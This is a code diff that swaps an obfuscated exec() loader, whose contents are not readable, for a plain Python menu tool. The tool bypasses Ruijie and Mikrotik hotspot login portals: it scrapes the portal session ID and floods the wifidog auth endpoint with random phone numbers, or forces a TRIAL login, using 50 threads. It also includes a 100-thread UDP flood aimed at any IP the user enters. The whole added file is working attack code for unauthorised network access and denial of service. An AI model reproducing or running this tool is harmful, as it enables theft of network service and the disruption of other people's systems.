@@ -1,2 +1,130 @@
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode(b'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'))))
+import os, sys, time, threading, socket, requests, re, urllib3, random
+from urllib.parse import urlparse, parse_qs
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# --- COLORS ---
+R, G, Y, C, W, M = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;36m", "\033[1;37m", "\033[1;35m"
+
+stop_event = threading.Event()
+
+def banner():
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print(f"""{M}
+   █████╗ ██╗   ██╗███╗   ██╗ ██████╗ 
+  ██╔══██╗██║   ██║████╗  ██║██╔════╝ 
+  ███████║██║   ██║██╔██╗ ██║██║  ███╗
+  ██╔══██║██║   ██║██║╚██╗██║██║   ██║
+  ██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝
+  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ {W}MYO HEIN{Y}
+====================================================
+  CORE    : {W}Ruijie / Mikrotik / Turbo{Y}
+  ENGINE  : {G}Auth Injector v4.0 (Stable){Y}
+===================================================={W}""")
+
+# --- GLOBAL ENGINE ---
+def turbo_injector(url):
+    session = requests.Session()
+    while not stop_event.is_set():
+        try:
+            # SSL check ကျော်ပြီး Gateway ဆီ request အတင်းပို့တာပါ
+            session.get(url, timeout=5, verify=False)
+            print(f"{G}[✓] Injecting Packets... [Turbo On]{W}", end="\r")
+        except: pass
+
+# --- BYPASS FUNCTIONS ---
+
+def ruijie_mode():
+    banner()
+    print(f"{C}[*] Ruijie Voucher Bypass{W}")
+    try:
+        # Portal URL ကို အလိုအလျောက်ဖမ်းတာပါ
+        res = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
+        parsed = urlparse(res.url)
+        params = parse_qs(parsed.query)
+        
+        gw = params.get('gw_address', ['192.168.60.1'])[0]
+        port = params.get('gw_port', ['2060'])[0]
+        sid = params.get('sessionId', [None])[0]
+        
+        if not sid:
+            r_page = requests.get(res.url, verify=False)
+            sid = re.search(r'sessionId=([a-zA-Z0-9]+)', r_page.text).group(1)
+
+        print(f"{G}[+] Gateway: {gw} | SID: {sid}{W}")
+        # Ruijie wifidog logic ကို random ဖုန်းနံပါတ်နဲ့ exploit လုပ်တာပါ
+        target = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber={random.randint(11111111, 99999999)}"
+        
+        stop_event.clear()
+        for _ in range(50):
+            threading.Thread(target=turbo_injector, args=(target,), daemon=True).start()
+            
+        input(f"\n{Y}Ruijie Bypass Active... Press Enter to STOP.{W}")
+        stop_event.set()
+    except: print(f"{R}[!] Ruijie Portal Detect မရပါ!{W}"); time.sleep(2)
+
+def mikrotik_mode():
+    banner()
+    print(f"{C}[*] Mikrotik Auth Bypass (Voucher/Trial Mode){W}")
+    gw = input(f"{Y}Enter Mikrotik Gateway IP: {W}")
+    if not gw: return
+    
+    # Mikrotik ရဲ့ Trial သို့မဟုတ် Voucher login ကို Force လုပ်မယ့် URL
+    target = f"http://{gw}/login?username=TRIAL&dst=http://google.com"
+    
+    print(f"{M}[!] Launching Mikrotik Injector...{W}")
+    stop_event.clear()
+    for _ in range(50):
+        threading.Thread(target=turbo_injector, args=(target,), daemon=True).start()
+        
+    input(f"\n{G}Mikrotik Force Login Active... Press Enter to STOP.{W}")
+    stop_event.set()
+
+def turbo_udp():
+    banner()
+    print(f"{R}[*] Turbo Engine (UDP Flood Mode){W}")
+    ip = input(f"{Y}Enter Target IP: {W}")
+    try:
+        port = int(input(f"{Y}Enter Port (Default 80): {W}") or 80)
+    except: return
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = os.urandom(1024)
+    
+    stop_event.clear()
+    def flood():
+        while not stop_event.is_set():
+            try: sock.sendto(data, (ip, port))
+            except: break
+
+    print(f"{R}[!] UDP Flood Sending to {ip}...{W}")
+    for _ in range(100):
+        threading.Thread(target=flood, daemon=True).start()
+        
+    input(f"\n{G}Turbo Engine Running... Press Enter to STOP.{W}")
+    stop_event.set()
+
+# --- MAIN MENU ---
+
+def main():
+    while True:
+        try:
+            banner()
+            print(f"{G}[1]{W} Ruijie Bypass")
+            print(f"{G}[2]{W} Mikrotik Bypass")
+            print(f"{G}[3]{W} Turbo Engine (UDP)")
+            print(f"{R}[0]{W} Exit")
+            
+            choice = input(f"\n{C}Choice > {W}")
+            if choice == '1': ruijie_mode()
+            elif choice == '2': mikrotik_mode()
+            elif choice == '3': turbo_udp()
+            elif choice == '0':
+                print(f"{G}GGMU! Victory for United! 🔴⚪⚫{W}")
+                sys.exit()
+        except KeyboardInterrupt:
+            stop_event.set()
+            break
+
+if __name__ == "__main__":
+    main()
